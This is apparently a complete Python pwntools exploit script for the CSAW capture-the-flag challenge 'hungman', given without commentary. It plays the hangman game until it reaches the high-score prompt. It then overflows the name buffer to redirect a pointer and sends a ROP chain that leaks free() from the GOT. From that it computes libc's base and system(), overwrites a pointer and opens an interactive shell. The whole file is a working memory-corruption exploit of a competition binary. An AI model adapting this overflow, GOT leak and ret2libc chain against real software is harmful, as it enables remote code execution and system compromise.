from pwn import *
import time

HOST, PORT = '0.0.0.0', 6500
HOST, PORT = 'pwn.chal.csaw.io', 8003
r = remote(HOST, PORT)
elf = ELF('/media/sf_j/Downloads/hungman')
libc = ELF('/media/sf_j/Downloads/libc-2.23.so')
print hex(libc.symbols['free'])
print hex(libc.symbols['system'])

r.recvline()
r.send('A' * 0x18)
r.recvline()
go = False
while go != True:
	for i in range(26):
		if go is not None:
			data = r.recvline()
			print data
		if 'High score!' in data:
			go = True
			break
		if 'Default Highscore' in data:
			r.recvuntil('? ')
			r.sendline('y')
			go = False
			break
		r.sendline(chr(97+i))
r.sendline('y')
payload = 'B' * 0x20+p32(50000)+p32(2)+ p64(0x602038)
r.send(payload)
r.recvline()
r.recvuntil('? ')
r.sendline('y')
while True:
	data = r.recvline()
	print data
	if 'High score!' in data:
		break
	if 'Highest player' in data:
		print 'yo'
		r.recvuntil('? ')
		r.sendline('y')
		continue
	r.send('a')
r.sendline('y')
payload = p64(0x4010da) + p64(0) + p64(0x400f75)
r.send(payload)
time.sleep(1)
stage = p64(0x4007e1) * (0xa8 / 8)
stage += p64(0x00000000004010e3) + p64(0x602018) + p64(0x400810) + p64(0x0000000000400965) + p64(0x602038 - 8 + 272) + p64(0x400f75)
r.send(stage)
time.sleep(1)
data = r.recvline()[:-1]
data = data.ljust(8, "\x00")
free = u64(data)
libc_base = free - libc.symbols['free']
system = libc_base + libc.symbols['system']
print hex(libc_base)
print 'free', hex(free)
print 'system', hex(system)
stage = 'sh'.ljust(8, "\x00") + p64(system)
r.send(stage)
r.interactive()